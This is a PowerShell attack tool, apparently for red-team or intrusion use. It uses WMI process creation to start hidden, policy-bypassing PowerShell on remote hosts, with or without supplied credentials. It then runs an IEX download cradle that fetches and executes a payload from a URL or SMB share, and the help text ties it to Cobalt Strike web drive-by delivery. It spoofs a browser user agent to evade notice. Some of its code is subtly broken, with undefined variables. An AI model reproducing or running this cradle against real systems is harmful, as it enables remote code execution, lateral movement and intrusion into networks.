function Invoke-WorkerWmicDriveBy{
    param(
    #Parameter assignment
    [Parameter(Mandatory = $True, Position = 0)] 
    [string]$URL,
    [Parameter(Mandatory = $False, Position = 1)] 
    [string]$User,
    [Parameter(Mandatory = $False, Position = 2)] 
    [string]$Pass,
    [Parameter(Mandatory = $False, Position = 3)] 
    [string[]]$TARGETS = "."

  )

    if($User -and $Pass){
      #Did the user specify credentials?
      Write-Verbose "Set to run with Username: $User and Password: $Pass"

      $password = ConvertTo-SecureString $Pass -asplaintext -force 
      $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password

      #Set the proxy and user agent to blend in

      $powershellcmd = "`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('$URL'))"
      $cmd = "powershell.exe -exec bypass -w hidden -command $powershellcmd"

      Write-Verbose "Executing `"$cmd`" on `"$Target`""
      Invoke-WmiMethod -class Win32_process -name Create -Argumentlist $cmd -Credential $cred -ComputerName $TARGETS 

    }
    else{
      Write-Verbose "Username and/or password not specified. Running in current user context."
    
      #Set the proxy and user agent to blend in
      $powershellcmd = "`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('$URL'))"
      $cmd = "powershell.exe -exec bypass -w hidden -command $powershellcmd"
    
      Write-Verbose "Executing `"$cmd`" on `"$Target`""
      Invoke-WmiMethod -class Win32_process -name Create -Argumentlist $cmd -ComputerName $TARGETS
    }
}

function Invoke-WmicDriveBySMB{
  param(
    #parameter assignment
    [Parameter(Mandatory = $True, Position = 0)]
    [string]$FilePath,
    [Parameter(Mandatory = $False, Position = 1)]
    [string]$User,
    [Parameter(Mandatory = $False, Position = 2)]
    [string]$Pass,
    [Parameter(Mandatory = $True, Position = 3)]
    [string[]]$TARGETS
  )

  if($User -and $Pass){
    Write-Verbose "Set to run with $User:$Pass"

    $password = ConvertTo-SecureString $Pass -asplaintext -force
    $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password

    $FilePath = $FilePath.replace(':','$')
    $FilePath = $FilePath.replace('\','/')

    $powershellcmd = "`$wc = New-Object Net.Webclient; IEX `$wc.DownloadString('file:$FilePath')"
    $cmd = "powershell.exe -exec bypass -w hidden -command $powershellcmd"

    Write-Verbose "Executing `"$cmd`" on `"$Target`""
    Invoke-WmiMethod -class Win32_process -name Create -Argumentlist $cmd -Credential $cred -ComputerName $TARGETS

  }
  else{
    Write-Verbose "Username and/or password not specified. Running in current user context."

    $FilePath = $FilePath.replace(':','$')
    $FilePath = $FilePath.replace('\','/')

    $powershellcmd = "`$wc = New-Object Net.Webclient; IEX `$wc.DownloadString('file:$FilePath')"
    $cmd = "powershell.exe -exec bypass -w hidden -command $powershellcmd"

    Write-Verbose "Executing `"$cmd`" on `"$Target`""
    Invoke-WmiMethod -class Win32_process -name Create -Argumentlist $cmd -ComputerName $TARGETS
  }
}

function Invoke-WmicDriveBy{

  <#
  .SYNOPSIS
  This script uses wmic to open a powershell process and use the IEX download cradle to execute a powershell web drive by payload.

  .DESCRIPTION 
  This function calls wmic process call create to execute the powershell command for the IEX download cradle. The cradle is used to execute a payload delivered via
  the powershell web drive by exploitation module in cobaltstrike. Wmic runs with the permissions of the current user by default.

  .EXAMPLE
  > Invoke-WmicDriveBy -URL http://127.0.0.1/update -User test\jonny -Pass "Kg^*dksLkD$" -TARGET 192.168.1.10
  Run the script with user credentials for a specific host

  .EXAMPLE
  > Invoke-WmicDriveBy -URL http://192.168.1.101/a 
  Run the script against the localhost with the current user credentials

  .EXAMPLE
  > Invoke-WmicDriveBy -UNCPath "\\192.168.1.110\C$\Windows\Temp\smb" -TARGETS 192.168.1.77
  Use a raw file containing powershell commands for web delivery in the current user context

  .PARAMETER User
  Specify a username  Default is the current user context. 

  .PARAMETER Pass
  Specify the password for the appropriate user

  .PARAMETER URL
  URL for the powershell web delivery. Required. 

  .PARAMETER UNCPath
  The full UNC path to the raw file containing a powershell script.

  .PARAMETER TARGETS
  Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost. 

  #>
  [CmdletBinding()]
  param(
    #Parameter assignment
    [Parameter(ParameterSetName = "URL", Mandatory = $True, Position = 0)] 
    [string]$URL,
    [Parameter(ParameterSetName = "File", Mandatory = $True, Position = 0)]
    [string]$UNCPath,
    [Parameter(Mandatory = $False, Position = 1)] 
    [string]$User,
    [Parameter(Mandatory = $False, Position = 2)] 
    [string]$Pass,
    [Parameter(ValueFromPipeline=$True,Mandatory = $False, Position = 3)] 
    [string[]]$TARGETS = "."

  )

  

  Begin
  {
    #Check if the TARGETS parameter was passed through the pipeline. Set the usedParameter variable to true. 
    $usedParameter = $False 
    if($PSBoundParameters.ContainsKey('TARGETS'))
    {
      $usedParameter = $True 
    }

  }

  Process
  {
    #If targets is passed via the parameter, complete function for each host. 
    if($usedParameter)
    {
      #If the URL parameter set is used, call the Invoke-WorkerWmicDriveBy function 
      if($PsCmdlet.ParameterSetName -eq "URL")
      {
        Foreach($computer in $TARGETS)
        {
          Invoke-WorkerWmicDriveBy "$URL" -User "$User" -Pass "$Pass" -TARGETS "$TARGETS" 
        }
      }
      #Otherwise use the Invoke-WmicDriveBySMB function
      else
      {
        Foreach($computer in $TARGETS)
        {
          Invoke-WmicDriveBySMB "$FilePath" -User "$User" -Pass "$Pass" -TARGETS "$TARGETS"
        }
      }

    }
    #Pass the value from the pipeline to the target parameter if the usedParameter variable is false.
    else
    {

      if($PsCmdlet.ParameterSetName -eq "URL")
      {
        Invoke-WorkerWmicDriveBy "$URL" -User "$User" -Pass "$Pass" -TARGETS $_
      }
      else
      {
        Invoke-WmicDriveBySMB "$FilePath" -User "$User" -Pass "$Pass" -TARGETS $_
      }
    }

  }

  end{}
}
